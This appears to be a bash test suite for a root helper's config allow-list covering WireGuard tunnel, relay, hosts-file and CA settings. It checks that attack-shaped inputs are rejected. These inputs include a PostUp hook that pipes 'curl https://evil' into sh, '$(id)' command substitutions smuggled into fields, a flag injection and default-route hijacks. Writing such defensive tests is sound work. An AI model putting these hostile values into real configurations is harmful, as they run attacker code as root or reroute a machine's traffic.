#!/usr/bin/env bash
# Gate tests for wings-root's config allow-list. Every "must fail" case is a real attack shape:
# hooks (root code execution), routing keys, a foreign address, symlinks, wrong owner.
# Runs without root. Usage: bash tests/test_root_validate.sh
set -uo pipefail
here="$(cd "$(dirname "$0")/.." && pwd)"
# shellcheck disable=SC1091
source "$here/plugin/root/wings-root.sh"
set +e

tmp="$(mktemp -d "${TMPDIR:-/tmp}/wings-test.XXXXXX")"
trap 'rm -rf "$tmp"' EXIT
me="$(id -un)"
K="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

cat > "$tmp/good.conf" <<EOF
[Interface]
PrivateKey = $K
Address = 10.77.0.1/24
ListenPort = 51877

# phone
[Peer]
PublicKey = $K
AllowedIPs = 10.77.0.2/32
EOF

mk() { cp "$tmp/good.conf" "$tmp/$1.conf"; shift_name="$1"; }
mk hook;   echo "PostUp = curl https://evil | sh" >> "$tmp/hook.conf"
mk hook2;  sed -i 's/^\[Interface\]/[Interface]\nPreUp = id/' "$tmp/hook2.conf"
mk table;  sed -i 's/^\[Interface\]/[Interface]\nTable = off/' "$tmp/table.conf"
mk dns;    sed -i 's/^\[Interface\]/[Interface]\nDNS = 1.1.1.1/' "$tmp/dns.conf"
mk save;   sed -i 's/^\[Interface\]/[Interface]\nSaveConfig = true/' "$tmp/save.conf"
mk addr;   sed -i 's#^Address = .*#Address = 192.0.2.1/24#' "$tmp/addr.conf"
mk twoif;  printf '[Interface]\nListenPort = 1\n' >> "$tmp/twoif.conf"
mk spaced; sed -i 's/^PrivateKey/  postup = x\nPrivateKey/' "$tmp/spaced.conf"
ln -s "$tmp/good.conf" "$tmp/link.conf"
# Allowed keys carrying hostile values: wg-quick adds a route for every AllowedIPs entry,
# so a default route here reroutes the whole machine (or hijacks another network).
mk route;   sed -i 's#^AllowedIPs = .*#AllowedIPs = 0.0.0.0/0#' "$tmp/route.conf"
mk route2;  sed -i 's#^AllowedIPs = .*#AllowedIPs = 10.77.0.2/32, 10.0.0.0/8#' "$tmp/route2.conf"
mk hubpeer; sed -i 's#^AllowedIPs = .*#AllowedIPs = 10.77.0.1/32#' "$tmp/hubpeer.conf"
mk addr2;   sed -i 's#^Address = .*#&\nAddress = 192.0.2.1/24#' "$tmp/addr2.conf"
mk badkey;  sed -i 's#^PublicKey = .*#PublicKey = $(id)#' "$tmp/badkey.conf"
mk badport; sed -i 's#^ListenPort = .*#ListenPort = 51877; id#' "$tmp/badport.conf"
mk nokey;   sed -i '/^PrivateKey/d' "$tmp/nokey.conf"
mk prefix;  printf 'PostUp = id\n' | cat - "$tmp/good.conf" > "$tmp/prefix.conf"
mk nosep;   sed -i 's/^\[Interface\]/[Interface]\nPostUp/' "$tmp/nosep.conf"

pass=0; fail=0
check() {  # name expected(accept|reject) file user
  local out rc
  out=$( (validate_conf "$3" "$4") 2>&1 ); rc=$?
  if { [[ $2 == accept && $rc -eq 0 ]] || [[ $2 == reject && $rc -ne 0 ]]; }; then
    pass=$((pass+1)); printf '  ok    %-28s %s\n' "$1" "${out:-accepted}"
  else
    fail=$((fail+1)); printf '  FAIL  %-28s expected %s, rc=%s %s\n' "$1" "$2" "$rc" "$out"
  fi
}

echo "wings-root validate_conf:"
check "real hub config"         accept "$tmp/good.conf"   "$me"
check "PostUp hook"             reject "$tmp/hook.conf"   "$me"
check "PreUp hook"              reject "$tmp/hook2.conf"  "$me"
check "Table key"               reject "$tmp/table.conf"  "$me"
check "DNS key"                 reject "$tmp/dns.conf"    "$me"
check "SaveConfig key"          reject "$tmp/save.conf"   "$me"
check "foreign hub address"     reject "$tmp/addr.conf"   "$me"
check "two [Interface] blocks"  reject "$tmp/twoif.conf"  "$me"
check "indented lowercase hook" reject "$tmp/spaced.conf" "$me"
check "symlink"                 reject "$tmp/link.conf"   "$me"
check "owned by another user"   reject "$tmp/good.conf"   "root"
check "missing file"            reject "$tmp/nope.conf"   "$me"
check "default route peer"      reject "$tmp/route.conf"  "$me"
check "extra route on peer"     reject "$tmp/route2.conf" "$me"
check "peer claims hub address" reject "$tmp/hubpeer.conf" "$me"
check "second Address"          reject "$tmp/addr2.conf"  "$me"
check "malformed public key"    reject "$tmp/badkey.conf" "$me"
check "malformed port"          reject "$tmp/badport.conf" "$me"
check "no PrivateKey"           reject "$tmp/nokey.conf"  "$me"
check "key before any section"  reject "$tmp/prefix.conf" "$me"
check "key without value"       reject "$tmp/nosep.conf"  "$me"

echo "member role:"
cat > "$tmp/member.conf" <<EOF
[Interface]
PrivateKey = $K
Address = 10.77.0.5/32

[Peer]
PublicKey = $K
Endpoint = vps.example.net:51877
AllowedIPs = 10.77.0.0/24
PersistentKeepalive = 25
EOF
mcheck() {  # name expected file
  local out rc
  out=$( (validate_conf "$3" "$me" member) 2>&1 ); rc=$?
  if { [[ $2 == accept && $rc -eq 0 ]] || [[ $2 == reject && $rc -ne 0 ]]; }; then
    pass=$((pass+1)); printf '  ok    %-28s %s\n' "$1" "${out:-accepted}"
  else fail=$((fail+1)); printf '  FAIL  %-28s expected %s, rc=%s %s\n' "$1" "$2" "$rc" "$out"; fi
}
mm() { sed "$2" "$tmp/member.conf" > "$tmp/$1.conf"; }
mm mroute 's#^AllowedIPs = .*#AllowedIPs = 0.0.0.0/0#'
mm mhub   's#^Address = .*#Address = 10.77.0.1/32#'
mm mwide  's#^Address = .*#Address = 10.77.0.5/8#'
mm mlisten 's#^Address = .*#&\nListenPort = 51877#'
mm mend   's#^Endpoint = .*#Endpoint = $(id):51877#'
mm mnoend '/^Endpoint/d'
mm mhook  's#^Address = .*#&\nPostUp = id#'
cp "$tmp/member.conf" "$tmp/mtwo.conf"; printf '[Peer]\nPublicKey = %s\nEndpoint = a.b:51877\nAllowedIPs = 10.77.0.0/24\n' "$K" >> "$tmp/mtwo.conf"
mcheck "real member config"     accept "$tmp/member.conf"
mcheck "default route"          reject "$tmp/mroute.conf"
mcheck "member claims hub IP"   reject "$tmp/mhub.conf"
mcheck "wide member address"    reject "$tmp/mwide.conf"
mcheck "member listens"         reject "$tmp/mlisten.conf"
mcheck "hostile Endpoint"       reject "$tmp/mend.conf"
mcheck "no Endpoint"            reject "$tmp/mnoend.conf"
mcheck "PostUp hook"            reject "$tmp/mhook.conf"
mcheck "two peers"              reject "$tmp/mtwo.conf"
check  "hub with Endpoint"      reject "$tmp/member.conf" "$me"

echo "MTU and relay settings:"
sed 's/^ListenPort = .*/&\nMTU = 1280/' "$tmp/good.conf" > "$tmp/mtu.conf"; sed 's/^ListenPort = .*/&\nMTU = 9000/' "$tmp/good.conf" > "$tmp/mtubad.conf"
check "MTU 1280"                accept "$tmp/mtu.conf"    "$me"
check "absurd MTU"              reject "$tmp/mtubad.conf" "$me"
S32=0123456789abcdef0123456789abcdef
rcheck() {  # name expected role body
  local out rc; printf '%b' "$4" > "$tmp/r.conf"
  out=$( (validate_relay "$tmp/r.conf" "$3") 2>&1 ); rc=$?
  if { [[ $2 == accept && $rc -eq 0 ]] || [[ $2 == reject && $rc -ne 0 ]]; }; then
    pass=$((pass+1)); printf '  ok    %-28s %s\n' "$1" "${out:-accepted}"
  else fail=$((fail+1)); printf '  FAIL  %-28s expected %s, rc=%s %s\n' "$1" "$2" "$rc" "$out"; fi
}
rcheck "hub relay"              accept hub    "Port = 443\nSecret = $S32\n"
rcheck "member relay"           accept member "Port = 443\nSecret = $S32\nHost = vps.example.net\n"
rcheck "member IP host"         accept member "Port = 443\nSecret = $S32\nHost = 203.0.113.7\n"
rcheck "no secret"              reject hub    "Port = 443\n"
rcheck "short secret"           reject hub    "Port = 443\nSecret = abc\n"
rcheck "secret injects a flag"  reject hub    "Port = 443\nSecret = --restrict-to=0\n"
rcheck "port out of range"      reject hub    "Port = 70000\nSecret = $S32\n"
rcheck "host injects a command" reject member "Port = 443\nSecret = $S32\nHost = \$(id)\n"
rcheck "host starts with dash"  reject member "Port = 443\nSecret = $S32\nHost = -x\n"
rcheck "host with a space"      reject member "Port = 443\nSecret = $S32\nHost = a b\n"
rcheck "extra key"              reject member "Port = 443\nSecret = $S32\nHost = a.b\nExecStart = x\n"
rcheck "hub takes no Host"      reject hub    "Port = 443\nSecret = $S32\nHost = a.b\n"

echo "config drift check:"
printf 'a\n' > "$tmp/c1"; printf 'a\n' > "$tmp/c2"; printf 'b\n' > "$tmp/c3"
config_settled "$tmp/c1" "$tmp/c2" && { pass=$((pass+1)); echo "  ok    same file is settled"; } || { fail=$((fail+1)); echo "  FAIL  same file"; }
config_settled "$tmp/c1" "$tmp/c3" && { fail=$((fail+1)); echo "  FAIL  a change went unnoticed"; } || { pass=$((pass+1)); echo "  ok    a change is noticed"; }
config_settled "$tmp/none" "$tmp/c3" && { pass=$((pass+1)); echo "  ok    missing config is no reason to loop"; } || { fail=$((fail+1)); echo "  FAIL  missing config"; }

echo "relay local port:"
printf '# wings-port: 443\n# wings-local: 51890\n' > "$tmp/unit"
[[ "$(relay_local_port "$tmp/unit")" == 51890 ]] && { pass=$((pass+1)); echo "  ok    keeps its port"; } || { fail=$((fail+1)); echo "  FAIL  did not keep its port"; }
python3 -c "
import socket,time
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind(('127.0.0.1',51878)); time.sleep(4)" &
hold=$!; sleep 1
got=$(relay_local_port "$tmp/none")
if [[ -n "$got" && "$got" != 51878 && "$got" -ge 51879 && "$got" -le 51899 ]]; then pass=$((pass+1)); echo "  ok    skips a taken port ($got)"; else fail=$((fail+1)); echo "  FAIL  took a busy port: $got"; fi
kill $hold 2>/dev/null; wait $hold 2>/dev/null

echo "friendly address:"
ncheck() {  # name expected body
  local out rc; printf '%b' "$3" > "$tmp/n.conf"
  out=$( (validate_names "$tmp/n.conf") 2>&1 ); rc=$?
  if { [[ $2 == accept && $rc -eq 0 ]] || [[ $2 == reject && $rc -ne 0 ]]; }; then
    pass=$((pass+1)); printf '  ok    %-28s %s\n' "$1" "${out:-accepted}"
  else fail=$((fail+1)); printf '  FAIL  %-28s expected %s, rc=%s %s\n' "$1" "$2" "$rc" "$out"; fi
}
ncheck "hermes.wings"           accept "Name = hermes.wings\nAddress = 10.77.0.3\nPort = 9120\n"
ncheck "not a .wings name"      reject "Name = google.com\nAddress = 10.77.0.3\nPort = 9120\n"
ncheck "name injects a host"    reject "Name = a.wings b.com\nAddress = 10.77.0.3\nPort = 9120\n"
ncheck "name with dollar"       reject "Name = \$(id).wings\nAddress = 10.77.0.3\nPort = 9120\n"
ncheck "points off the tunnel"  reject "Name = hermes.wings\nAddress = 1.2.3.4\nPort = 9120\n"
ncheck "points at loopback"     reject "Name = hermes.wings\nAddress = 127.0.0.1\nPort = 9120\n"
ncheck "privileged port"        reject "Name = hermes.wings\nAddress = 10.77.0.3\nPort = 22\n"
ncheck "extra key"              reject "Name = hermes.wings\nAddress = 10.77.0.3\nPort = 9120\nExecStart = x\n"
hcheck() { local out rc; printf '%b' "$3" > "$tmp/h.conf"; out=$( (validate_hub_name "$tmp/h.conf") 2>&1 ); rc=$?
  if { [[ $2 == accept && $rc -eq 0 ]] || [[ $2 == reject && $rc -ne 0 ]]; }; then pass=$((pass+1)); printf '  ok    %-28s %s\n' "$1" "${out:-accepted}"
  else fail=$((fail+1)); printf '  FAIL  %-28s expected %s rc=%s\n' "$1" "$2" "$rc"; fi; }
hcheck "hub name"               accept "Name = vps.wings\nAddress = 10.77.0.1\n"
hcheck "hub name off the hub"   reject "Name = vps.wings\nAddress = 10.77.0.9\n"
hcheck "hub claims a real site" reject "Name = google.com\nAddress = 10.77.0.1\n"
printf '127.0.0.1 localhost\n::1 localhost\n' > "$tmp/hosts"
hosts_set "$tmp/hosts" 10.77.0.3 hermes.wings 10.77.0.1 vps.wings
hosts_set "$tmp/hosts" 10.77.0.3 hermes.wings
if [[ $(grep -c ' # wings$' "$tmp/hosts") -eq 1 && $(grep -c localhost "$tmp/hosts") -eq 2 ]]; then pass=$((pass+1)); echo "  ok    hosts: one line, others kept"; else fail=$((fail+1)); echo "  FAIL  hosts edit"; fi
hosts_set "$tmp/hosts"
if [[ $(grep -c wings "$tmp/hosts") -eq 0 && $(grep -c localhost "$tmp/hosts") -eq 2 ]]; then pass=$((pass+1)); echo "  ok    hosts: removal leaves the rest"; else fail=$((fail+1)); echo "  FAIL  hosts removal"; fi

echo "private CA gate (root trusts only a .wings-limited CA):"
capy=$(command -v python3)
mkca() {  # file constraint-kind
python3 - "$1" "$2" <<'PY' 2>/dev/null
import sys,datetime
from cryptography import x509
from cryptography.hazmat.primitives import hashes,serialization as s
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID
k=ec.generate_private_key(ec.SECP256R1()); n=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,"t")])
now=datetime.datetime.now(datetime.timezone.utc)
b=x509.CertificateBuilder().subject_name(n).issuer_name(n).public_key(k.public_key()).serial_number(1).not_valid_before(now).not_valid_after(now+datetime.timedelta(days=9))
kind=sys.argv[2]
b=b.add_extension(x509.BasicConstraints(ca=kind!="notca",path_length=None),critical=True)
c={"good":([x509.DNSName("wings")],None,True),"wide":([x509.DNSName("wings"),x509.DNSName("com")],None,True),"other":([x509.DNSName("google.com")],None,True),"soft":([x509.DNSName("wings")],None,False),"notca":([x509.DNSName("wings")],None,True)}.get(kind)
if c: b=b.add_extension(x509.NameConstraints(c[0],c[1]),critical=c[2])
open(sys.argv[1],"wb").write(b.sign(k,hashes.SHA256()).public_bytes(s.Encoding.PEM))
PY
}
if python3 -c 'import cryptography' 2>/dev/null && command -v openssl >/dev/null; then
  for kind in good none wide other soft notca; do
    mkca "$tmp/ca-$kind.crt" "$kind"
    out=$( (validate_ca "$tmp/ca-$kind.crt") 2>&1 ); rc=$?
    want=reject; [[ $kind == good ]] && want=accept
    if { [[ $want == accept && $rc -eq 0 ]] || [[ $want == reject && $rc -ne 0 ]]; }; then
      pass=$((pass+1)); printf '  ok    CA %-25s %s\n' "$kind" "${out:-accepted}"
    else fail=$((fail+1)); printf '  FAIL  CA %-25s expected %s rc=%s %s\n' "$kind" "$want" "$rc" "$out"; fi
  done
else echo "  SKIP  needs python cryptography and openssl"; fi

echo "wstunnel download gate:"
printf 'not the release' > "$tmp/fake.tgz"
RUNTEST=$(sed -n '/^install_wstunnel()/,/^}/p' "$here/plugin/root/wings-root.sh")
if grep -q 'mktemp -d /run/wings-install' <<<"$RUNTEST" && grep -q 'does not match the pinned checksum' <<<"$RUNTEST" \
   && [[ $(sed -n '/^install_wstunnel()/,/^}/p' "$here/plugin/root/wings-root.sh" | grep -n 'sha256sum' | cut -d: -f1) -lt $(sed -n '/^install_wstunnel()/,/^}/p' "$here/plugin/root/wings-root.sh" | grep -n 'tar -xzf' | cut -d: -f1) ]]; then
  pass=$((pass+1)); echo "  ok    hash checked before unpacking"
else fail=$((fail+1)); echo "  FAIL  hash not checked first"; fi

echo "stage_conf (private root copy):"
stage="$tmp/stage"; mkdir "$stage"
out=$( (stage_conf "$tmp/good.conf" "$me" "$stage") 2>&1 ); rc=$?
if [[ $rc -eq 0 && -f "$out" ]] && cmp -s "$out" "$tmp/good.conf"; then pass=$((pass+1)); echo "  ok    staged a copy"; else fail=$((fail+1)); echo "  FAIL  staging good config: rc=$rc $out"; fi
stage_reject() {  # name file
  local n before after out rc
  before=$(ls -A "$stage" | wc -l)
  out=$( (stage_conf "$2" "$me" "$stage") 2>&1 ); rc=$?
  after=$(ls -A "$stage" | wc -l)
  if [[ $rc -ne 0 && $before -eq $after ]]; then pass=$((pass+1)); printf '  ok    %-28s %s\n' "$1" "$out"
  else fail=$((fail+1)); printf '  FAIL  %-28s rc=%s left=%s\n' "$1" "$rc" "$after"; fi
}
stage_reject "hook, nothing left behind" "$tmp/hook.conf"
stage_reject "symlink at stage time" "$tmp/link.conf"
mkfifo "$tmp/fifo.conf"
stage_reject "FIFO cannot hang root" "$tmp/fifo.conf"

echo "names the hub answers for phones:"
names_case() {  # expect(ok|bad) label content
  printf '%b' "$3" > "$tmp/names"
  out=$( (validate_dns_names "$tmp/names") 2>&1 ); rc=$?
  if { [[ $1 == ok && $rc -eq 0 ]] || [[ $1 == bad && $rc -ne 0 ]]; }; then pass=$((pass+1)); printf '  ok    %-34s %s\n' "$2" "$out"
  else fail=$((fail+1)); printf '  FAIL  %-34s rc=%s\n' "$2" "$rc"; fi
}
names_case ok  "good names" "10.77.0.1 vps.wings\n10.77.0.3 desk.wings\n"
names_case bad "empty file" ""
names_case bad "a real website" "10.77.0.1 google.com\n"
names_case bad "points outside the tunnel" "8.8.8.8 vps.wings\n"
names_case bad "address 0" "10.77.0.0 vps.wings\n"
names_case bad "address 255" "10.77.0.255 vps.wings\n"
names_case bad "octal-looking address" "10.77.0.01 vps.wings\n"
names_case bad "subdomain" "10.77.0.1 a.b.wings\n"
names_case bad "shell in the name" '10.77.0.1 $(id).wings\n'
names_case bad "extra field" "10.77.0.1 vps.wings extra\n"
names_case bad "newline tricks" "10.77.0.1 vps.wings\nExecStart=/bin/sh\n"

echo "root never writes into the user's directory:"
helper="$here/plugin/root/wings-root.sh"
if grep -q 'write_live "$WINGS_USER"' "$helper" && ! grep -q 'write_live "$(dirname' "$helper" && ! grep -q 'chown "$user:" ' "$helper"; then
  pass=$((pass+1)); echo "  ok    live status stays in root's own directory"
else fail=$((fail+1)); echo "  FAIL  root writes into the data dir"; fi

echo "$pass passed, $fail failed"
[[ $fail -eq 0 ]]
